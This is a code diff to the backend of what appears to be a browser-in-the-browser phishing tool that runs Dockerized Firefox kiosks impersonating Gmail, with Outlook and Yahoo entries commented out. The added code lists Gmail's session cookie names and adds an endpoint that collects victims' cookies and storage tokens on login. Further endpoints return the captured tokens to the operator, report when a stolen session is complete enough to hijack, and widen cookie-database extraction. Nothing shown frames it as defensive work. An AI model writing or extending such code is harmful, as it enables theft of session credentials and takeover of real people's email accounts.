@@ -58,9 +58,27 @@ app.add_middleware(
 app.include_router(auth_router)
 
 PHISHLETS = {
-    "gmail": {"label": "Gmail", "url": "https://gmail.com", "port": 5801, "redirect_url": ""},
-    "outlook": {"label": "Outlook", "url": "https://outlook.com", "port": 5802, "redirect_url": ""},
-    "yahoo": {"label": "Yahoo Mail", "url": "https://mail.yahoo.com", "port": 5803, "redirect_url": ""},
+    "gmail": {
+        "label": "Gmail",
+        "url": "https://gmail.com",
+        "port": 5801,
+        "redirect_url": "",
+        "auth_cookies": ["SID", "HSID", "SSID", "APISID", "SAPISID", "OSID"],
+    },
+    # "outlook": {
+    #     "label": "Outlook",
+    #     "url": "https://outlook.live.com",
+    #     "port": 5802,
+    #     "redirect_url": "",
+    #     "auth_cookies": ["OutlookIdentity", "OutlookSession", "RPSSecAuth", "MSPAuth"],
+    # },
+    # "yahoo": {
+    #     "label": "Yahoo Mail",
+    #     "url": "https://mail.yahoo.com",
+    #     "port": 5803,
+    #     "redirect_url": "",
+    #     "auth_cookies": ["T", "Y"],
+    # },
 }
 
 
@@ -88,6 +106,13 @@ class VisitEvent(BaseModel):
 class LogEvent(BaseModel):
     level: str
     message: str
+
+
+class LoginDetectedEvent(BaseModel):
+    phishletKey: str
+    currentUrl: str
+    cookies: list[dict] = []
+    storageTokens: list[dict] = []
 
 
 def docker_env() -> Dict[str, str]:
@@ -176,6 +201,7 @@ async def startup():
     await db.users.create_index("email", unique=True)
     await db.phishlet_settings.create_index("key", unique=True)
     await db.visits.create_index([("phishlet_key", 1), ("timestamp", -1)])
+    await db.login_events.create_index([("phishlet_key", 1), ("timestamp", -1)])
     await ensure_firefox_image()
     async for doc in db.phishlet_settings.find({}):
         key = doc.get("key")
@@ -280,6 +306,10 @@ async def list_phishlets(email: str = Depends(get_current_user)):
     async for doc in db.phishlet_settings.find({"pause_url": {"$exists": True, "$ne": ""}}, {"key": 1}):
         paused_keys.add(doc.get("key"))
 
+    logged_in_keys = set()
+    async for doc in db.login_events.find({}, {"phishlet_key": 1}):
+        logged_in_keys.add(doc.get("phishlet_key"))
+
     kiosk_settings = {}
     async for doc in db.phishlet_settings.find({}, {"key": 1, "kiosk": 1}):
         if "kiosk" in doc:
@@ -297,6 +327,7 @@ async def list_phishlets(email: str = Depends(get_current_user)):
             "port": cfg["port"],
             "running": running_container is not None,
             "paused": key in paused_keys,
+            "login_detected": key in logged_in_keys,
             "kiosk": kiosk_settings.get(key, True),
             "container_id": running_container["id"] if running_container else "",
             "status": running_container["status"] if running_container else "",
@@ -314,9 +345,14 @@ async def launch_phishlet(body: PhishletLaunchRequest, email: str = Depends(get_
     redirect_url = phishlet.get("redirect_url", "") or ""
     await run_docker(["rm", "-f", container_name])
     await run_docker(["volume", "rm", f"{container_name}-config"])
+    await db.phishlet_credentials.delete_many({"container": container_name})
+    await db.login_events.delete_many({"phishlet_key": body.key})
     result = await run_docker([
         "run", "-d", "--name", container_name, "--shm-size=2g",
         "--network", "btb_attack_default",
+        "--dns", "8.8.8.8",
+        "--dns", "8.8.4.4",
+        "--add-host", "host.docker.internal:host-gateway",
         "-p", phishlet_port_arg(phishlet['port']),
         "-e", f"FF_OPEN_URL={phishlet['url']}",
         "-e", f"FF_KIOSK={FF_KIOSK_DEFAULT}",
@@ -383,6 +419,107 @@ async def post_visit(body: VisitEvent):
     return {"ok": True}
 
 
+@app.post("/api/phishlets/login-detected")
+async def post_login_detected(body: LoginDetectedEvent):
+    if body.phishletKey not in PHISHLETS:
+        return {"ok": False}
+    ts = datetime.now(timezone.utc)
+    container_name = f"phishlet-{body.phishletKey}"
+    for cookie in body.cookies:
+        await db.phishlet_credentials.update_one(
+            {"container": container_name, "name": cookie.get("name")},
+            {"$set": {
+                "value": cookie.get("value", ""),
+                "domain": cookie.get("domain", ""),
+                "host": cookie.get("host", ""),
+                "path": cookie.get("path", "/"),
+                "expires": cookie.get("expires", 0),
+                "secure": cookie.get("secure", False),
+                "httpOnly": cookie.get("httpOnly", False),
+                "sameSite": cookie.get("sameSite", "unspecified"),
+                "updated_at": ts,
+            }},
+            upsert=True,
+        )
+    for token in body.storageTokens:
+        await db.phishlet_credentials.update_one(
+            {"container": container_name, "name": token.get("name"), "type": "storage"},
+            {"$set": {
+                "value": token.get("value", ""),
+                "domain": token.get("domain", ""),
+                "host": token.get("host", ""),
+                "path": token.get("path", "/"),
+                "secure": token.get("secure", True),
+                "httpOnly": token.get("httpOnly", False),
+                "sameSite": token.get("sameSite", "no_restriction"),
+                "session": token.get("session", True),
+                "firstPartyDomain": token.get("firstPartyDomain", ""),
+                "partitionKey": token.get("partitionKey"),
+                "storeId": token.get("storeId", "0"),
+                "type": "storage",
+                "updated_at": ts,
+            }},
+            upsert=True,
+        )
+    await db.login_events.insert_one({
+        "phishlet_key": body.phishletKey,
+        "current_url": body.currentUrl,
+        "timestamp": ts,
+        "cookie_count": len(body.cookies),
+        "storage_count": len(body.storageTokens),
+    })
+    try:
+        with open(LOG_FILE, "a", encoding="utf-8") as f:
+            f.write(f"[{ts.isoformat()}] [login-detected] key={body.phishletKey} cookies={len(body.cookies)} storage={len(body.storageTokens)}\n")
+    except Exception:
+        pass
+    return {"ok": True}
+
+
+@app.get("/api/phishlets/login-events")
+async def get_login_events(since: float = Query(0), email: str = Depends(get_current_user)):
+    cursor = db.login_events.find({"timestamp": {"$gt": datetime.fromtimestamp(since, timezone.utc)}}).sort("timestamp", 1).limit(100)
+    events = []
+    async for e in cursor:
+        events.append({
+            "phishlet_key": e["phishlet_key"],
+            "current_url": e.get("current_url", ""),
+            "timestamp": e["timestamp"].isoformat() if e.get("timestamp") else None,
+            "cookie_count": e.get("cookie_count", 0),
+            "storage_count": e.get("storage_count", 0),
+        })
+    return {"events": events}
+
+
+@app.get("/api/phishlets/storage-tokens")
+async def get_storage_tokens(key: str = Query(...), email: str = Depends(get_current_user)):
+    if key not in PHISHLETS:
+        raise HTTPException(status_code=404, detail=f"Unknown phishlet key: {key}")
+    container_name = f"phishlet-{key}"
+    cursor = db.phishlet_credentials.find({
+        "container": container_name,
+        "type": "storage",
+    })
+    tokens = []
+    async for doc in cursor:
+        tokens.append({
+            "name": doc.get("name", ""),
+            "value": doc.get("value", ""),
+            "domain": doc.get("domain", ""),
+            "host": doc.get("host", ""),
+            "path": doc.get("path", "/"),
+            "secure": doc.get("secure", True),
+            "httpOnly": doc.get("httpOnly", False),
+            "sameSite": doc.get("sameSite", "no_restriction"),
+            "session": doc.get("session", True),
+            "firstPartyDomain": doc.get("firstPartyDomain", ""),
+            "partitionKey": doc.get("partitionKey"),
+            "storeId": doc.get("storeId", "0"),
+            "expirationDate": doc.get("expires", 0),
+        })
+    return {"storage_tokens": tokens}
+
+
 @app.post("/api/phishlets/log")
 async def post_log(body: LogEvent):
     ts = datetime.now(timezone.utc)
@@ -409,6 +546,51 @@ async def get_visits(key: str = Query(...), limit: int = Query(20, le=200), emai
             "timestamp": v["timestamp"].isoformat() if v.get("timestamp") else None,
         })
     return {"visits": visits}
+
+
+@app.get("/api/phishlets/status")
+async def get_phishlet_status(key: str = Query(...), email: str = Depends(get_current_user)):
+    if key not in PHISHLETS:
+        raise HTTPException(status_code=404, detail=f"Unknown phishlet key: {key}")
+
+    container_name = f"phishlet-{key}"
+    auth_cookies = PHISHLETS[key].get("auth_cookies", [])
+
+    if not auth_cookies:
+        return {
+            "key": key,
+            "label": PHISHLETS[key]["label"],
+            "has_cookies": False,
+            "cookie_count": 0,
+            "required_count": 0,
+            "ready": False,
+        }
+
+    result = await run_docker(["ps", "--format", "{{.Names}}|{{.ID}}|{{.Image}}|{{.Status}}"])
+    running = {}
+    if result["status"] == "success":
+        for line in result["message"].split("\n"):
+            parts = line.strip().split("|")
+            if len(parts) == 4:
+                running[parts[0]] = {"id": parts[1][:12], "status": parts[3], "image": parts[2]}
+
+    container_running = container_name in running
+
+    count = await db.phishlet_credentials.count_documents({
+        "container": container_name,
+        "name": {"$in": auth_cookies},
+    })
+
+    ready = container_running and count >= len(auth_cookies)
+
+    return {
+        "key": key,
+        "label": PHISHLETS[key]["label"],
+        "has_cookies": count > 0,
+        "cookie_count": count,
+        "required_count": len(auth_cookies),
+        "ready": ready,
+    }
 
 
 @app.post("/api/phishlets/{key}/restart")
@@ -496,10 +678,14 @@ async def toggle_kiosk(key: str, email: str = Depends(get_current_user)):
     redirect_url = phishlet.get("redirect_url", "") or ""
 
     await run_docker(["rm", "-f", container_name])
+    await db.login_events.delete_many({"phishlet_key": key})
 
     result = await run_docker([
         "run", "-d", "--name", container_name, "--shm-size=2g",
         "--network", "btb_attack_default",
+        "--dns", "8.8.8.8",
+        "--dns", "8.8.4.4",
+        "--add-host", "host.docker.internal:host-gateway",
         "-p", phishlet_port_arg(phishlet['port']),
         "-e", f"FF_OPEN_URL={phishlet['url']}",
         "-e", f"FF_KIOSK={'1' if new_kiosk else '0'}",
@@ -542,7 +728,9 @@ async def rebuild_image(email: str = Depends(get_current_user)):
 
 
 @app.get("/api/credentials")
-async def get_credentials(target: str = "", email: str = Depends(get_current_user)):
+async def get_credentials(target: str = "", key: str = "", email: str = Depends(get_current_user)):
+    if key:
+        target = f"phishlet-{key}"
     if target:
         target = validate_container_name(target)
 
@@ -607,7 +795,10 @@ async def get_credentials(target: str = "", email: str = Depends(get_current_use
                 continue
             data = await run_docker([
                 "exec", "-i", "-e", f"COOKIE_PATH={path}", name, "sh", "-c",
-                'cp "$COOKIE_PATH" /tmp/cookies.sqlite && python3 - 2>/dev/null && rm /tmp/cookies.sqlite',
+                'cp "$COOKIE_PATH" /tmp/cookies.sqlite && '
+                'cp "$COOKIE_PATH-wal" /tmp/cookies.sqlite-wal 2>/dev/null || true && '
+                'cp "$COOKIE_PATH-shm" /tmp/cookies.sqlite-shm 2>/dev/null || true && '
+                'python3 - 2>/dev/null && rm -f /tmp/cookies.sqlite /tmp/cookies.sqlite-wal /tmp/cookies.sqlite-shm',
             ], input_text=cookie_script)
             if data["status"] == "success" and data["message"].strip():
                 lines.append(data["message"])
